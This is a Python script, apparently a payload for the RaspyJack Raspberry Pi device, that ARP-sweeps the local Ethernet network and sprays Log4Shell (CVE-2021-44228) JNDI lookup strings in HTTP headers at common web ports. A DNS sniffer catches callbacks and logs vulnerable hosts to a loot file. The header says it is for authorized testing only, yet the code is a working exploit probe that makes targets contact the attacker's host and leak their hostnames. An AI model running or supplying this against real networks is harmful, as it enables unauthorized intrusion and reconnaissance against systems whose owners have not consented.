#!/usr/bin/env python3
"""
RaspyJack *payload* – **Log4Shell Vulnerability Scanner (eth0)**
=================================================================
An advanced payload that scans the local Ethernet network for hosts
vulnerable to the Log4Shell (CVE-2021-44228) vulnerability.

The payload works by:
1.  Discovering live hosts on the local network.
2.  Sending HTTP requests to common web ports on those hosts.
3.  The requests contain a JNDI lookup string in various headers, pointing
    to the RaspyJack's IP address.
4.  A DNS listener runs in the background on the RaspyJack. If a host is
    vulnerable, its Log4j instance will attempt to resolve the JNDI address,
    resulting in a DNS query to our listener.
5.  Vulnerable hosts are logged and displayed on the screen.

**Disclaimer:** This is a reconnaissance tool. It does not execute code
on the target. For educational and authorized testing purposes only.
"""

# ---------------------------------------------------------------------------
# 0) Imports & boilerplate
# ---------------------------------------------------------------------------
import os, sys, subprocess, signal, time, threading, socket, requests
from queue import Queue
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))

# ---------------------------- Third‑party libs ----------------------------
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

try:
    from scapy.all import *
    conf.verb = 0
except ImportError:
    print("Scapy is not installed. Please run: pip install scapy", file=sys.stderr)
    sys.exit(1)

# ---------------------------------------------------------------------------
# 1) GPIO mapping (BCM)
# ---------------------------------------------------------------------------
PINS: dict[str, int] = { "OK": 13, "KEY3": 16 } # Simplified for this payload

# ---------------------------------------------------------------------------
# 2) GPIO & LCD initialisation
# ---------------------------------------------------------------------------
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = 128, 128
FONT = ImageFont.load_default()
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)

# ---------------------------------------------------------------------------
# 3) Global State & Configuration
# ---------------------------------------------------------------------------
ETH_INTERFACE = "eth0"
LOOT_DIR = "/root/Raspyjack/loot/Log4Shell/"
WEB_PORTS = [80, 8080, 443, 8443]
running = True
ui_lock = threading.Lock()
vulnerable_hosts = []
scan_status = "Starting..."

# ---------------------------------------------------------------------------
# 4) Graceful shutdown
# ---------------------------------------------------------------------------
def cleanup(*_):
    global running
    running = False

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

# ---------------------------------------------------------------------------
# 5) UI Functions
# ---------------------------------------------------------------------------
def draw_ui():
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "Log4Shell Scanner", font=FONT_TITLE, fill="#FF0000")
    d.line([(0, 22), (128, 22)], fill="#FF0000", width=1)

    with ui_lock:
        d.text((5, 25), f"Status: {scan_status}", font=FONT, fill="yellow")
        
        d.text((5, 40), "Vulnerable Hosts:", font=FONT, fill="orange")
        y_pos = 50
        for host in vulnerable_hosts[-5:]: # Display last 5 found
            d.text((8, y_pos), host, font=FONT, fill="white")
            y_pos += 10

    d.text((5, 115), "Press KEY3 to Exit", font=FONT, fill="cyan")
    LCD.LCD_ShowImage(img, 0, 0)

# ---------------------------------------------------------------------------
# 6) Core Scanner Logic
# ---------------------------------------------------------------------------
def get_local_ip():
    return get_if_addr(ETH_INTERFACE)

def dns_listener(local_ip):
    """Listens for DNS queries directed at our IP."""
    global scan_status
    
    def handle_dns_packet(pkt):
        global scan_status
        if pkt.haslayer(DNSQR) and pkt[DNS].qr == 0: # Is a query
            qname = pkt[DNSQR].qname.decode()
            # Our payload is designed to make the victim look up a subdomain of our IP
            if local_ip in qname:
                victim_ip = pkt[IP].src
                if victim_ip not in vulnerable_hosts:
                    with ui_lock:
                        scan_status = f"VULNERABLE: {victim_ip}"
                        vulnerable_hosts.append(victim_ip)
                        save_loot()

    sniff(filter=f"udp port 53 and dst host {local_ip}", prn=handle_dns_packet, stop_filter=lambda p: not running)

def save_loot():
    os.makedirs(LOOT_DIR, exist_ok=True)
    loot_file = os.path.join(LOOT_DIR, "vulnerable_hosts.txt")
    with open(loot_file, "w") as f:
        f.writelines([f"{host}\n" for host in vulnerable_hosts])

def run_scan():
    global scan_status
    
    local_ip = get_local_ip()
    if not local_ip:
        with ui_lock: scan_status = "eth0 has no IP!"
        return

    # Start DNS listener in background
    threading.Thread(target=dns_listener, args=(local_ip,), daemon=True).start()
    
    # Discover hosts
    with ui_lock: scan_status = "Discovering hosts..."
    network_range = subprocess.check_output(f"ip -o -4 addr show {ETH_INTERFACE} | awk '{{print $4}}'", shell=True).decode().strip()
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network_range), timeout=5, iface=ETH_INTERFACE, verbose=0)
    live_hosts = [received.psrc for sent, received in ans]
    
    # The JNDI payload
    # The victim will look up <victim_ip>.<our_ip>.raspyjack.local
    # We listen for DNS queries for *.raspyjack.local
    payload = "${jndi:ldap://${hostName}." + local_ip + ".raspyjack.local/a}"
    headers = { "User-Agent": payload, "X-Api-Version": payload, "Referer": payload }

    for host in live_hosts:
        if not running: break
        with ui_lock: scan_status = f"Scanning {host}..."
        
        for port in WEB_PORTS:
            if not running: break
            protocol = "https" if port in [443, 8443] else "http"
            url = f"{protocol}://{host}:{port}"
            
            try:
                requests.get(url, headers=headers, timeout=2, verify=False)
            except requests.exceptions.RequestException:
                pass # We don't care if the request fails, we just need to send it

    with ui_lock:
        if running:
            scan_status = "Scan finished."

# ---------------------------------------------------------------------------
# 7) Main Loop
# ---------------------------------------------------------------------------
try:
    # Disable requests' insecure request warnings
    requests.packages.urllib3.disable_warnings()

    scan_thread = threading.Thread(target=run_scan, daemon=True)
    scan_thread.start()

    while running:
        draw_ui()
        
        if GPIO.input(PINS["KEY3"]) == 0:
            cleanup()
            break
        
        time.sleep(1) # UI refresh rate

except (KeyboardInterrupt, SystemExit):
    pass
except Exception as e:
    print(f"[ERROR] {e}", file=sys.stderr)
finally:
    cleanup()
    if scan_thread:
        scan_thread.join(timeout=1)
    LCD.LCD_Clear()
    GPIO.cleanup()
    print("Log4Shell Scanner payload finished.")
